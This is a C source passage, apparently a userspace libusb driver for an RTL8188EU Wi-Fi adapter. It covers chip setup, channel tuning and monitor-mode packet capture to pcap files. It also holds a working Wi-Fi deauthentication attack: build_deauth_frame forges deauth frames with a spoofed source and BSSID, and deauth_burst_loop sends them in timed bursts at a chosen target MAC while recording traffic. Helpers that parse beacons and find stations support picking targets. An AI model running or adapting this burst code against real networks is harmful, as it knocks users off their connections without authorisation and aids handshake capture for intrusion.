    val16 &= (uint16_t)~FPGA0_RF_RFENV;
    val16 |= rfsi_rfenv;
    write16(d, REG_FPGA0_XA_RF_SW_CTRL, val16);
}

static void usb_quirks(rtl8188eu_t *d) {
    uint16_t val16 = read16(d, REG_CR);
    val16 |= (uint16_t)(CR_MAC_TX_ENABLE | CR_MAC_RX_ENABLE);
    write16(d, REG_CR, val16);

    uint32_t val32 = read32(d, REG_TXDMA_OFFSET_CHK);
    val32 |= TXDMA_OFFSET_DROP_DATA_EN;
    write32(d, REG_TXDMA_OFFSET_CHK, val32);

    write8(d, (uint16_t)(REG_EARLY_MODE_CONTROL_8188E + 3), 0x01);
}

static void init_aggregation(rtl8188eu_t *d) {
    uint8_t usb_spec = read8(d, REG_USB_SPECIAL_OPTION);
    usb_spec &= (uint8_t)~USB_SPEC_USB_AGG_ENABLE;
    write8(d, REG_USB_SPECIAL_OPTION, usb_spec);

    uint8_t agg_ctrl = read8(d, REG_TRXDMA_CTRL);
    agg_ctrl &= (uint8_t)~TRXDMA_CTRL_RXDMA_AGG_EN;
    write8(d, REG_TRXDMA_CTRL, agg_ctrl);
}

static void enable_rf(rtl8188eu_t *d) {
    write8(d, REG_RF_CTRL, (uint8_t)(RF_ENABLE | RF_RSTB | RF_SDMRSTB));

    uint32_t val32 = read32(d, REG_OFDM0_TRX_PATH_ENABLE);
    val32 &= ~(OFDM_RF_PATH_RX_MASK | OFDM_RF_PATH_TX_MASK);
    val32 |= OFDM_RF_PATH_RX_A | OFDM_RF_PATH_TX_A;
    write32(d, REG_OFDM0_TRX_PATH_ENABLE, val32);
    write8(d, REG_TXPAUSE, 0x00);
}

static void configure_initial_rx(rtl8188eu_t *d) {
    write8(d, REG_RX_DRVINFO_SZ, 4);
    uint32_t rcr =
        RCR_ACCEPT_AP |
        RCR_ACCEPT_PHYS_MATCH |
        RCR_ACCEPT_MCAST |
        RCR_ACCEPT_BCAST |
        RCR_ACCEPT_ADDR3 |
        RCR_ACCEPT_PM |
        RCR_ACCEPT_DATA_FRAME |
        RCR_ACCEPT_CTRL_FRAME |
        RCR_ACCEPT_MGMT_FRAME |
        RCR_ACCEPT_CRC32 |
        RCR_ACCEPT_ICV |
        RCR_HTC_LOC_CTRL |
        RCR_APPEND_PHYSTAT |
        RCR_APPEND_ICV |
        RCR_APPEND_MIC |
        RCR_APPEND_FCS;
    write32(d, REG_RCR, rcr);
}

static void set_channel(rtl8188eu_t *d, int channel, int bw) {
    int primary_channel = channel;
    uint8_t opmode = read8(d, REG_BW_OPMODE);
    uint32_t rsr = read32(d, REG_RESPONSE_RATE_SET);

    if (bw == 20) {
        opmode |= BW_OPMODE_20MHZ;
        write8(d, REG_BW_OPMODE, opmode);

        uint32_t val32 = read32(d, REG_FPGA0_RF_MODE);
        val32 &= ~FPGA_RF_MODE;
        write32(d, REG_FPGA0_RF_MODE, val32);

        val32 = read32(d, REG_FPGA1_RF_MODE);
        val32 &= ~FPGA_RF_MODE;
        write32(d, REG_FPGA1_RF_MODE, val32);
    } else if (bw == 40) {
        bool sec_ch_above = true;
        int primary = channel;
        channel = sec_ch_above ? (primary + 2) : (primary - 2);

        opmode &= (uint8_t)~BW_OPMODE_20MHZ;
        write8(d, REG_BW_OPMODE, opmode);
        rsr &= ~RSR_RSC_BANDWIDTH_40M;
        rsr |= sec_ch_above ? RSR_RSC_LOWER_SUB_CHANNEL : RSR_RSC_UPPER_SUB_CHANNEL;
        write32(d, REG_RESPONSE_RATE_SET, rsr);

        uint32_t val32 = read32(d, REG_FPGA0_RF_MODE);
        val32 |= FPGA_RF_MODE;
        write32(d, REG_FPGA0_RF_MODE, val32);

        val32 = read32(d, REG_FPGA1_RF_MODE);
        val32 |= FPGA_RF_MODE;
        write32(d, REG_FPGA1_RF_MODE, val32);

        val32 = read32(d, REG_CCK0_SYSTEM);
        val32 &= ~CCK0_SIDEBAND;
        if (!sec_ch_above) val32 |= CCK0_SIDEBAND;
        write32(d, REG_CCK0_SYSTEM, val32);

        val32 = read32(d, REG_OFDM1_LSTF);
        val32 &= ~OFDM_LSTF_PRIME_CH_MASK;
        val32 |= sec_ch_above ? OFDM_LSTF_PRIME_CH_LOW : OFDM_LSTF_PRIME_CH_HIGH;
        write32(d, REG_OFDM1_LSTF, val32);

        val32 = read32(d, REG_FPGA0_POWER_SAVE);
        val32 &= ~(FPGA0_PS_LOWER_CHANNEL | FPGA0_PS_UPPER_CHANNEL);
        val32 |= sec_ch_above ? FPGA0_PS_UPPER_CHANNEL : FPGA0_PS_LOWER_CHANNEL;
        write32(d, REG_FPGA0_POWER_SAVE, val32);
    } else {
        die("bw must be 20 or 40");
    }

    uint32_t val32 = read_rfreg(d, RF6052_REG_MODE_AG);
    val32 = replace_bits(val32, (uint32_t)channel, MODE_AG_CHANNEL_MASK);
    write_rfreg(d, RF6052_REG_MODE_AG, val32);

    val32 = read_rfreg(d, RF6052_REG_MODE_AG);
    val32 &= ~MODE_AG_BW_MASK;
    val32 |= (bw == 40) ? MODE_AG_BW_40MHZ_8723B : MODE_AG_BW_20MHZ_8723B;
    write_rfreg(d, RF6052_REG_MODE_AG, val32);
    d->current_channel = primary_channel;
}

static void init_device(rtl8188eu_t *d, const char *firmware_path, int channel, int bw) {
    power_on(d);
    init_queue_reserved_page(d);
    write16(d, (uint16_t)(REG_TRXFF_BNDY + 2), (uint16_t)d->fops.trxff_boundary);
    uint8_t pbp = (uint8_t)(((uint32_t)d->fops.pbp_rx << PBP_PAGE_SIZE_RX_SHIFT) | ((uint32_t)d->fops.pbp_tx << PBP_PAGE_SIZE_TX_SHIFT));
    write8(d, REG_PBP, pbp);
    init_llt_table(d);

    size_t fw_len = 0;
    uint8_t *fw = load_firmware(firmware_path, &fw_len);
    if (!fw) dief("Firmware load failed: %s", firmware_path);
    download_firmware(d, fw, fw_len);
    start_firmware(d);
    free(fw);

    init_mac(d);
    init_phy_bb(d);
    init_phy_rf(d);
    usb_quirks(d);
    init_aggregation(d);

    uint32_t val32 = read32(d, REG_FPGA0_RF_MODE);
    val32 |= FPGA_RF_MODE_CCK | FPGA_RF_MODE_OFDM;
    write32(d, REG_FPGA0_RF_MODE, val32);

    enable_rf(d);
    set_channel(d, channel, bw);
    configure_initial_rx(d);
}

static bool parse_rxdesc16(const uint8_t *buf, size_t len, rxdesc16_t *out) {
    if (len < 24) return false;
    uint32_t d0 = le32(buf + 0);
    uint32_t d2 = le32(buf + 8);
    uint32_t d3 = le32(buf + 12);
    uint32_t tsfl = le32(buf + 20);

    out->pktlen = (uint16_t)(d0 & 0x3FFF);
    out->crc32 = (uint8_t)((d0 >> 14) & 0x1);
    out->icverr = (uint8_t)((d0 >> 15) & 0x1);
    out->drvinfo_sz = (uint8_t)((d0 >> 16) & 0xF);
    out->shift = (uint8_t)((d0 >> 24) & 0x3);

    out->pkt_cnt = (uint8_t)((d2 >> 16) & 0xFF);

    out->rxmcs = (uint8_t)(d3 & 0x3F);
    out->rxht = (uint8_t)((d3 >> 6) & 0x1);
    out->bw = (uint8_t)((d3 >> 9) & 0x1);
    out->rpt_sel = (uint8_t)((d3 >> 14) & 0x3);

    out->tsfl = tsfl;
    return true;
}

static size_t roundup(size_t value, size_t multiple) {
    return ((value + multiple - 1) / multiple) * multiple;
}

static int fc_version(const uint8_t *payload, size_t len) {
    if (len < 2) return 3;
    uint16_t fc = le16(payload);
    return (int)(fc & 0x3);
}

static void fmt_mac(const uint8_t *addr, char out[18]) {
    if (!addr) {
        snprintf(out, 18, "??:??:??:??:??:??");
        return;
    }
    snprintf(out, 18, "%02x:%02x:%02x:%02x:%02x:%02x", addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]);
}

static void pcap_write_u32(FILE *fp, uint32_t v) {
    uint8_t b[4];
    put_le32(b, v);
    fwrite(b, 1, 4, fp);
}

static void pcap_write_u16(FILE *fp, uint16_t v) {
    uint8_t b[2];
    put_le16(b, v);
    fwrite(b, 1, 2, fp);
}

static void pcap_write_global_header(FILE *fp, uint32_t linktype, uint32_t snaplen) {
    pcap_write_u32(fp, 0xA1B2C3D4);
    pcap_write_u16(fp, 2);
    pcap_write_u16(fp, 4);
    pcap_write_u32(fp, 0);
    pcap_write_u32(fp, 0);
    pcap_write_u32(fp, snaplen);
    pcap_write_u32(fp, linktype);
    fflush(fp);
}

static void pcap_write_packet(FILE *fp, const uint8_t *payload, uint32_t len) {
    struct timeval tv;
    gettimeofday(&tv, NULL);
    pcap_write_u32(fp, (uint32_t)tv.tv_sec);
    pcap_write_u32(fp, (uint32_t)tv.tv_usec);
    pcap_write_u32(fp, len);
    pcap_write_u32(fp, len);
    fwrite(payload, 1, len, fp);
}

static int chan_to_freq_mhz(int ch) {
    if (ch == 14) return 2484;
    if (ch >= 1 && ch <= 13) return 2407 + ch * 5;
    return 0;
}

static size_t radiotap_header(uint32_t tsft, int channel, const uint8_t *flags_opt, uint8_t *out, size_t out_cap) {
    bool has_flags = flags_opt != NULL;
    uint32_t present = has_flags ? 0x0000000B : 0x00000009;
    uint16_t freq = (uint16_t)chan_to_freq_mhz(channel);
    uint16_t chan_flags = 0x0080;
    uint8_t hdr[64];
    size_t n = 0;
    hdr[n++] = 0;
    hdr[n++] = 0;
    hdr[n++] = 0;
    hdr[n++] = 0;
    put_le32(hdr + n, present);
    n += 4;
    uint64_t ts = (uint64_t)tsft;
    for (int i = 0; i < 8; i++) hdr[n++] = (uint8_t)((ts >> (8 * i)) & 0xFF);
    if (has_flags) {
        hdr[n++] = *flags_opt;
        hdr[n++] = 0;
    }
    put_le16(hdr + n, freq);
    n += 2;
    put_le16(hdr + n, chan_flags);
    n += 2;
    put_le16(hdr + 2, (uint16_t)n);
    if (n > out_cap) return 0;
    memcpy(out, hdr, n);
    return n;
}

static uint32_t crc32_tab[256];
static bool crc32_tab_init = false;

static void init_crc32_tab(void) {
    for (uint32_t i = 0; i < 256; i++) {
        uint32_t c = i;
        for (int k = 0; k < 8; k++) c = (c & 1) ? (0xEDB88320u ^ (c >> 1)) : (c >> 1);
        crc32_tab[i] = c;
    }
    crc32_tab_init = true;
}

static uint32_t crc32_80211(const uint8_t *data, size_t len) {
    if (!crc32_tab_init) init_crc32_tab();
    uint32_t c = 0xFFFFFFFFu;
    for (size_t i = 0; i < len; i++) c = crc32_tab[(c ^ data[i]) & 0xFFu] ^ (c >> 8);
    return c ^ 0xFFFFFFFFu;
}

static void capture_pcap(rtl8188eu_t *d, FILE *fp, int max_reads, int read_size, int timeout_ms, bool include_bad_fcs, bool keep_fcs) {
    pcap_write_global_header(fp, 127, 65535);
    uint8_t *buf = (uint8_t *)xmalloc((size_t)read_size);
    int reads = 0;

    while (max_reads <= 0 || reads < max_reads) {
        int transferred = 0;
        int r = libusb_bulk_transfer(d->handle, d->ep_in, buf, read_size, &transferred, timeout_ms);
        if (r != 0) continue;
        if (transferred <= 0) continue;
        reads++;

        size_t off = 0;
        int pkt_cnt = 0;
        while (off + 24 <= (size_t)transferred) {
            rxdesc16_t desc;
            if (!parse_rxdesc16(buf + off, (size_t)transferred - off, &desc)) break;
            if (pkt_cnt == 0) pkt_cnt = desc.pkt_cnt > 0 ? desc.pkt_cnt : 1;
            size_t drvinfo_bytes = (size_t)desc.drvinfo_sz * 8;
            size_t pkt_offset = roundup((size_t)desc.pktlen + drvinfo_bytes + (size_t)desc.shift + 24, 128);
            size_t payload_start = off + 24 + drvinfo_bytes + (size_t)desc.shift;
            size_t payload_end = payload_start + (size_t)desc.pktlen;
            if (payload_end > (size_t)transferred) break;

            const uint8_t *payload = buf + payload_start;
            size_t plen = (size_t)desc.pktlen;

            if (desc.rpt_sel == 0 && plen && fc_version(payload, plen) == 0) {
                if (!include_bad_fcs && (desc.crc32 || desc.icverr)) {
                } else {
                    const uint8_t *frame = payload;
                    size_t frame_len = plen;
                    bool has_fcs = false;
                    if (!(desc.crc32 || desc.icverr) && plen >= 4) {
                        uint32_t fcs_le = le32(payload + plen - 4);
                        uint32_t calc = crc32_80211(payload, plen - 4);
                        if (fcs_le == calc) {
                            has_fcs = true;
                            if (!keep_fcs) frame_len = plen - 4;
                        }
                    }

                    uint8_t flags_val = 0;
                    uint8_t *flags_ptr = NULL;
                    if (keep_fcs) {
                        flags_val = has_fcs ? 0x10 : 0;
                        if (desc.crc32) flags_val |= 0x40;
                        flags_ptr = &flags_val;
                    }
                    uint8_t rtap[64];
                    size_t rtap_len = radiotap_header(desc.tsfl, d->current_channel, flags_ptr, rtap, sizeof(rtap));
                    if (rtap_len) {
                        uint32_t total = (uint32_t)(rtap_len + frame_len);
                        uint8_t *pkt = (uint8_t *)xmalloc(total);
                        memcpy(pkt, rtap, rtap_len);
                        memcpy(pkt + rtap_len, frame, frame_len);
                        pcap_write_packet(fp, pkt, total);
                        free(pkt);
                    }
                }
            }

            off += pkt_offset;
            pkt_cnt--;
            if (pkt_cnt <= 0) break;
        }

        fflush(fp);
    }

    free(buf);
}

static uint64_t now_ms(void);

static volatile sig_atomic_t g_stop = 0;

static void on_signal(int signum) {
    (void)signum;
    g_stop = 1;
}

static void dump_hex(FILE *fp, const uint8_t *buf, size_t n) {
    for (size_t i = 0; i < n; i++) fprintf(fp, "%02x", buf[i]);
}

static bool parse_mac_addr(const char *s, uint8_t out[6]) {
    if (!s) return false;
    char hex[12];
    size_t n = 0;
    for (size_t i = 0; s[i]; i++) {
        char c = s[i];
        if (c == ':' || c == '-' || c == '.' || c == ' ') continue;
        if ((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
            if (n >= sizeof(hex)) return false;
            hex[n++] = c;
        } else {
            return false;
        }
    }
    if (n != 12) return false;
    for (int i = 0; i < 6; i++) {
        char tmp[3] = { hex[i * 2], hex[i * 2 + 1], 0 };
        char *end = NULL;
        unsigned long v = strtoul(tmp, &end, 16);
        if (!end || *end != '\0' || v > 0xFFu) return false;
        out[i] = (uint8_t)v;
    }
    return true;
}

static uint16_t tx_desc32_csum(const uint8_t desc[32]) {
    uint8_t tmp[32];
    memcpy(tmp, desc, 32);
    tmp[28] = 0;
    tmp[29] = 0;
    uint16_t csum = 0;
    for (int i = 0; i < 16; i++) {
        uint16_t w = (uint16_t)tmp[i * 2] | ((uint16_t)tmp[i * 2 + 1] << 8);
        csum ^= w;
    }
    return csum;
}

enum {
    TXDESC32_AGG_BREAK = 1 << 6,
    TXDESC_BROADMULTICAST = 1 << 0,
    TXDESC_LAST_SEGMENT = 1 << 2,
    TXDESC_FIRST_SEGMENT = 1 << 3,
    TXDESC_OWN = 1 << 7,

    TXDESC_QUEUE_SHIFT = 8,
    TXDESC_QUEUE_BE = 0x0,
    TXDESC_QUEUE_MGNT = 0x12,

    TXDESC40_AGG_BREAK = 1 << 16,
    TXDESC32_USE_DRIVER_RATE = 1 << 8,
    TXDESC32_SEQ_SHIFT = 16,
    TXDESC32_RETRY_LIMIT_ENABLE = 1 << 17,
    TXDESC32_RETRY_LIMIT_SHIFT = 18,

    TXDESC_ANTENNA_SELECT_A = 1 << 24,
    TXDESC_ANTENNA_SELECT_B = 1 << 25,
    TXDESC_ANTENNA_SELECT_C = 1 << 29,

    DESC_RATE_6M = 0x04,
};

static void build_tx_desc32(const uint8_t *payload, size_t payload_len, uint8_t rate_id, uint8_t out_desc[32]) {
    uint16_t pkt_size = (uint16_t)payload_len;
    uint8_t pkt_offset = 32;

    uint8_t txdw0 = (uint8_t)(TXDESC_OWN | TXDESC_FIRST_SEGMENT | TXDESC_LAST_SEGMENT);
    if (payload_len >= 10) {
        uint8_t da0 = payload[4];
        if (da0 & 0x01) txdw0 |= (uint8_t)TXDESC_BROADMULTICAST;
    }

    uint16_t fc = payload_len >= 2 ? le16(payload) : 0;
    int ftype = (int)((fc >> 2) & 0x3);
    uint32_t queue = (uint32_t)(((ftype == 0) ? TXDESC_QUEUE_MGNT : TXDESC_QUEUE_BE) & 0x1F);
    uint32_t txdw1 = queue << TXDESC_QUEUE_SHIFT;

    uint32_t txdw2 = (uint32_t)(TXDESC40_AGG_BREAK | TXDESC_ANTENNA_SELECT_A | TXDESC_ANTENNA_SELECT_B);

    uint32_t seq_number = 0;
    if ((ftype == 0 || ftype == 2) && payload_len >= 24) {
        uint16_t seq_ctrl = le16(payload + 22);
        seq_number = (uint32_t)((seq_ctrl >> 4) & 0x0FFF);
    }
    uint32_t txdw3 = (seq_number & 0x0FFFu) << TXDESC32_SEQ_SHIFT;

    uint32_t txdw4 = (uint32_t)TXDESC32_USE_DRIVER_RATE;
    uint32_t txdw5 = (uint32_t)rate_id | ((uint32_t)6 << TXDESC32_RETRY_LIMIT_SHIFT) | (uint32_t)TXDESC32_RETRY_LIMIT_ENABLE;
    uint32_t txdw6 = 0;
    uint16_t txdw7 = (uint16_t)((TXDESC_ANTENNA_SELECT_C >> 16) & 0xFFFF);

    memset(out_desc, 0, 32);
    put_le16(out_desc + 0, pkt_size);
    out_desc[2] = pkt_offset;
    out_desc[3] = txdw0;
    put_le32(out_desc + 4, txdw1);
    put_le32(out_desc + 8, txdw2);
    put_le32(out_desc + 12, txdw3);
    put_le32(out_desc + 16, txdw4);
    put_le32(out_desc + 20, txdw5);
    put_le32(out_desc + 24, txdw6);
    put_le16(out_desc + 30, txdw7);
    uint16_t csum = tx_desc32_csum(out_desc);
    put_le16(out_desc + 28, csum);
}

static uint8_t select_tx_ep(rtl8188eu_t *d, const uint8_t *payload, size_t payload_len) {
    if (d->ep_out_len <= 0) die("No bulk OUT endpoints");
    uint16_t fc = payload_len >= 2 ? le16(payload) : 0;
    int ftype = (int)((fc >> 2) & 0x3);
    if (ftype == 0) return d->ep_out_eps[0];
    return d->ep_out_eps[d->ep_out_len - 1];
}

static int tx_frame(rtl8188eu_t *d, const uint8_t *payload, size_t payload_len, int timeout_ms, bool debug, int dump_bytes) {
    uint8_t desc[32];
    build_tx_desc32(payload, payload_len, DESC_RATE_6M, desc);

    size_t total = 32 + payload_len;
    uint8_t *data = (uint8_t *)xmalloc(total);
    memcpy(data, desc, 32);
    memcpy(data + 32, payload, payload_len);

    uint8_t ep = select_tx_ep(d, payload, payload_len);
    int transferred = 0;
    int r = libusb_bulk_transfer(d->handle, ep, data, (int)total, &transferred, timeout_ms);
    free(data);

    if (debug) {
        uint16_t pkt_size = le16(desc + 0);
        uint8_t pkt_offset = desc[2];
        uint8_t txdw0 = desc[3];
        uint32_t txdw1 = le32(desc + 4);
        uint32_t txdw2 = le32(desc + 8);
        uint32_t txdw3 = le32(desc + 12);
        uint32_t txdw4 = le32(desc + 16);
        uint32_t txdw5 = le32(desc + 20);
        uint32_t txdw6 = le32(desc + 24);
        uint16_t csum = le16(desc + 28);
        uint16_t txdw7 = le16(desc + 30);
        fprintf(stderr, "TX: ep=0x%02x total=%zu transferred=%d timeout_ms=%d r=%s\n",
                ep, total, transferred, timeout_ms, libusb_error_name(r));
        fprintf(stderr,
                "TX: desc pkt_size=%u pkt_offset=%u txdw0=0x%02x txdw1=0x%08x txdw2=0x%08x txdw3=0x%08x txdw4=0x%08x txdw5=0x%08x txdw6=0x%08x csum=0x%04x txdw7=0x%04x\n",
                (unsigned)pkt_size, (unsigned)pkt_offset, (unsigned)txdw0, txdw1, txdw2, txdw3, txdw4, txdw5, txdw6, (unsigned)csum, (unsigned)txdw7);

        if (payload_len >= 26) {
            uint16_t fc = le16(payload + 0);
            uint16_t dur = le16(payload + 2);
            char da_s[18], sa_s[18], bssid_s[18];
            fmt_mac(payload + 4, da_s);
            fmt_mac(payload + 10, sa_s);
            fmt_mac(payload + 16, bssid_s);
            uint16_t seq_ctrl = le16(payload + 22);
            uint16_t reason = le16(payload + 24);
            fprintf(stderr, "TX: 80211 fc=0x%04x dur=0x%04x da=%s sa=%s bssid=%s seq=%u reason=%u\n",
                    (unsigned)fc, (unsigned)dur, da_s, sa_s, bssid_s, (unsigned)((seq_ctrl >> 4) & 0x0FFF), (unsigned)reason);
        }

        if (dump_bytes > 0) {
            int dn = dump_bytes;
            if (dn > (int)payload_len) dn = (int)payload_len;
            fprintf(stderr, "TX: desc_hex=");
            dump_hex(stderr, desc, 32);
            fprintf(stderr, "\n");
            fprintf(stderr, "TX: payload_hex=");
            dump_hex(stderr, payload, (size_t)dn);
            fprintf(stderr, "\n");
        }
    }

    if (r != 0) return r;
    if (transferred != (int)total) return LIBUSB_ERROR_IO;
    return 0;
}

static size_t build_deauth_frame(const uint8_t da[6], const uint8_t sa[6], const uint8_t bssid[6], uint16_t seq, uint16_t reason, uint8_t out[64]) {
    uint16_t fc = 0x00C0;
    uint16_t duration = 0x013a;
    uint16_t seq_ctrl = (uint16_t)((seq & 0x0FFFu) << 4);
    put_le16(out + 0, fc);
    put_le16(out + 2, duration);
    memcpy(out + 4, da, 6);
    memcpy(out + 10, sa, 6);
    memcpy(out + 16, bssid, 6);
    put_le16(out + 22, seq_ctrl);
    put_le16(out + 24, reason);
    return 26;
}

static void deauth_burst_loop(
    rtl8188eu_t *d,
    FILE *fp,
    const uint8_t target_mac[6],
    const uint8_t bssid[6],
    const uint8_t source_mac[6],
    uint16_t reason,
    int burst_size,
    int burst_interval_ms,
    int burst_duration_s,
    int burst_read_timeout_ms,
    int max_reads,
    int read_size,
    bool include_bad_fcs,
    bool keep_fcs,
    int tx_timeout_ms,
    bool debug,
    int tx_dump_bytes
) {
    pcap_write_global_header(fp, 127, 65535);
    uint8_t *buf = (uint8_t *)xmalloc((size_t)read_size);
    uint64_t start = now_ms();
    uint64_t end = burst_duration_s > 0 ? start + (uint64_t)burst_duration_s * 1000u : 0;
    uint64_t next_burst = start;
    int reads = 0;
    uint64_t sent = 0;
    uint64_t tx_ok = 0;
    uint64_t tx_err = 0;
    uint64_t written = 0;
    uint64_t next_status = start + 1000u;

    while (!g_stop) {
        uint64_t now = now_ms();
        if (end && now >= end) break;

        if (now >= next_burst) {
            for (int i = 0; i < burst_size; i++) {
                uint8_t frame[64];
                size_t flen = build_deauth_frame(target_mac, source_mac, bssid, d->tx_seq, reason, frame);
                d->tx_seq = (uint16_t)((d->tx_seq + 1) & 0x0FFFu);
                int tr = tx_frame(d, frame, flen, tx_timeout_ms, debug, tx_dump_bytes);
                sent++;
                if (tr == 0) tx_ok++;
                else tx_err++;
                if (g_stop) break;
            }
            next_burst = now_ms() + (uint64_t)burst_interval_ms;
        }

        if (max_reads > 0 && reads >= max_reads) break;

        int transferred = 0;
        int r = libusb_bulk_transfer(d->handle, d->ep_in, buf, read_size, &transferred, burst_read_timeout_ms);
        if (r != 0 || transferred <= 0) continue;
        reads++;

        size_t off = 0;
        int pkt_cnt = 0;
        while (off + 24 <= (size_t)transferred) {
            rxdesc16_t desc;
            if (!parse_rxdesc16(buf + off, (size_t)transferred - off, &desc)) break;
            if (pkt_cnt == 0) pkt_cnt = desc.pkt_cnt > 0 ? desc.pkt_cnt : 1;
            size_t drvinfo_bytes = (size_t)desc.drvinfo_sz * 8;
            size_t pkt_offset = roundup((size_t)desc.pktlen + drvinfo_bytes + (size_t)desc.shift + 24, 128);
            size_t payload_start = off + 24 + drvinfo_bytes + (size_t)desc.shift;
            size_t payload_end = payload_start + (size_t)desc.pktlen;
            if (payload_end > (size_t)transferred) break;

            const uint8_t *payload = buf + payload_start;
            size_t plen = (size_t)desc.pktlen;

            if (desc.rpt_sel == 0 && plen && fc_version(payload, plen) == 0) {
                if (!include_bad_fcs && (desc.crc32 || desc.icverr)) {
                } else {
                    const uint8_t *frame = payload;
                    size_t frame_len = plen;
                    bool has_fcs = false;
                    if (!(desc.crc32 || desc.icverr) && plen >= 4) {
                        uint32_t fcs_le = le32(payload + plen - 4);
                        uint32_t calc = crc32_80211(payload, plen - 4);
                        if (fcs_le == calc) {
                            has_fcs = true;
                            if (!keep_fcs) frame_len = plen - 4;
                        }
                    }

                    uint8_t flags_val = 0;
                    uint8_t *flags_ptr = NULL;
                    if (keep_fcs) {
                        flags_val = has_fcs ? 0x10 : 0;
                        if (desc.crc32) flags_val |= 0x40;
                        flags_ptr = &flags_val;
                    }
                    uint8_t rtap[64];
                    size_t rtap_len = radiotap_header(desc.tsfl, d->current_channel, flags_ptr, rtap, sizeof(rtap));
                    if (rtap_len) {
                        uint32_t total = (uint32_t)(rtap_len + frame_len);
                        uint8_t *pkt = (uint8_t *)xmalloc(total);
                        memcpy(pkt, rtap, rtap_len);
                        memcpy(pkt + rtap_len, frame, frame_len);
                        pcap_write_packet(fp, pkt, total);
                        free(pkt);
                        written++;
                    }
                }
            }

            off += pkt_offset;
            pkt_cnt--;
            if (pkt_cnt <= 0) break;
        }
        fflush(fp);

        if (debug) {
            uint64_t t = now_ms();
            if (t >= next_status) {
                fprintf(stderr, "deauth-burst: sent=%" PRIu64 " ok=%" PRIu64 " err=%" PRIu64 " rx_reads=%d pcap_written=%" PRIu64 "\n",
                        sent, tx_ok, tx_err, reads, written);
                next_status = t + 1000u;
            }
        }
    }

    free(buf);
}

static void rx_loop(rtl8188eu_t *d, int max_reads, int read_size, int timeout_ms, bool good_fcs_only, int dump_bytes) {
    uint8_t *buf = (uint8_t *)xmalloc((size_t)read_size);
    int reads = 0;

    while (max_reads <= 0 || reads < max_reads) {
        int transferred = 0;
        int r = libusb_bulk_transfer(d->handle, d->ep_in, buf, read_size, &transferred, timeout_ms);
        if (r != 0) continue;
        if (transferred <= 0) continue;
        reads++;

        size_t off = 0;
        int pkt_cnt = 0;
        while (off + 24 <= (size_t)transferred) {
            rxdesc16_t desc;
            if (!parse_rxdesc16(buf + off, (size_t)transferred - off, &desc)) break;
            if (pkt_cnt == 0) pkt_cnt = desc.pkt_cnt > 0 ? desc.pkt_cnt : 1;
            size_t drvinfo_bytes = (size_t)desc.drvinfo_sz * 8;
            size_t pkt_offset = roundup((size_t)desc.pktlen + drvinfo_bytes + (size_t)desc.shift + 24, 128);
            size_t payload_start = off + 24 + drvinfo_bytes + (size_t)desc.shift;
            size_t payload_end = payload_start + (size_t)desc.pktlen;
            if (payload_end > (size_t)transferred) break;

            const uint8_t *payload = buf + payload_start;
            size_t plen = (size_t)desc.pktlen;
            if (desc.rpt_sel == 0 && plen) {
                if (good_fcs_only && desc.crc32) {
                } else {
                    char a1[18], a2[18], a3[18];
                    const uint8_t *addr1 = plen >= 10 ? payload + 4 : NULL;
                    const uint8_t *addr2 = plen >= 16 ? payload + 10 : NULL;
                    const uint8_t *addr3 = plen >= 22 ? payload + 16 : NULL;
                    fmt_mac(addr1, a1);
                    fmt_mac(addr2, a2);
                    fmt_mac(addr3, a3);
                    printf("len=%zu tsfl=0x%08x fcs_bad=%u ht=%u bw40=%u mcs=%u a1=%s a2=%s a3=%s\n",
                           plen, desc.tsfl, desc.crc32, desc.rxht, desc.bw, desc.rxmcs, a1, a2, a3);
                    if (dump_bytes > 0) {
                        size_t dn = plen < (size_t)dump_bytes ? plen : (size_t)dump_bytes;
                        for (size_t j = 0; j < dn; j++) printf("%02x", payload[j]);
                        printf("\n");
                    }
                    fflush(stdout);
                }
            }

            off += pkt_offset;
            pkt_cnt--;
            if (pkt_cnt <= 0) break;
        }
    }

    free(buf);
}

typedef struct {
    uint8_t bssid[6];
    char ssid[33];
    int channel;
    uint32_t last_tsfl;
    uint32_t seen;
} ap_entry_t;

static uint64_t now_ms(void) {
    struct timeval tv;
    gettimeofday(&tv, NULL);
    return (uint64_t)tv.tv_sec * 1000u + (uint64_t)tv.tv_usec / 1000u;
}

static bool mac_eq(const uint8_t a[6], const uint8_t b[6]) {
    return memcmp(a, b, 6) == 0;
}

static bool ssid_eq(const char *a, const char *b) {
    if (!a || !b) return false;
    return strcmp(a, b) == 0;
}

static bool parse_ssid_and_channel(const uint8_t *ies, size_t ies_len, char ssid_out[33], int *channel_out) {
    ssid_out[0] = 0;
    if (channel_out) *channel_out = 0;

    size_t off = 0;
    while (off + 2 <= ies_len) {
        uint8_t id = ies[off + 0];
        uint8_t len = ies[off + 1];
        off += 2;
        if (off + len > ies_len) break;
        if (id == 0) {
            size_t n = len;
            if (n > 32) n = 32;
            memcpy(ssid_out, ies + off, n);
            ssid_out[n] = 0;
        } else if (id == 3 && len == 1) {
            if (channel_out) *channel_out = (int)ies[off];
        }
        off += len;
    }
    return true;
}

static bool is_beacon_or_probe_resp(const uint8_t *frame, size_t len) {
    if (len < 24) return false;
    uint16_t fc = le16(frame);
    uint8_t type = (uint8_t)((fc >> 2) & 0x3);
    uint8_t subtype = (uint8_t)((fc >> 4) & 0xF);
    if (type != 0) return false;
    return subtype == 8 || subtype == 5;
}

static bool is_zero_mac(const uint8_t a[6]) {
    for (int i = 0; i < 6; i++) if (a[i] != 0) return false;
    return true;
}

static bool is_broadcast_mac(const uint8_t a[6]) {
    for (int i = 0; i < 6; i++) if (a[i] != 0xFF) return false;
    return true;
}

static bool is_unicast_mac(const uint8_t a[6]) {
    if (!a) return false;
    if (is_zero_mac(a) || is_broadcast_mac(a)) return false;
    return (a[0] & 0x01) == 0;
}

static bool extract_ap_info(const uint8_t *frame, size_t len, uint8_t bssid_out[6], char ssid_out[33], int *channel_out) {
    if (!is_beacon_or_probe_resp(frame, len)) return false;
    if (len < 36) return false;
    memcpy(bssid_out, frame + 16, 6);
    const uint8_t *ies = frame + 36;
    size_t ies_len = len - 36;
    parse_ssid_and_channel(ies, ies_len, ssid_out, channel_out);
    return true;
}

static bool extract_station(const uint8_t *frame, size_t len, const uint8_t bssid[6], uint8_t sta_out[6]) {
    if (len < 16) return false;
    uint16_t fc = le16(frame);
    uint8_t type = (uint8_t)((fc >> 2) & 0x3);
    uint8_t subtype = (uint8_t)((fc >> 4) & 0xF);
    uint8_t to_ds = (uint8_t)((fc >> 8) & 0x1);
    uint8_t from_ds = (uint8_t)((fc >> 9) & 0x1);

    const uint8_t *addr1 = frame + 4;
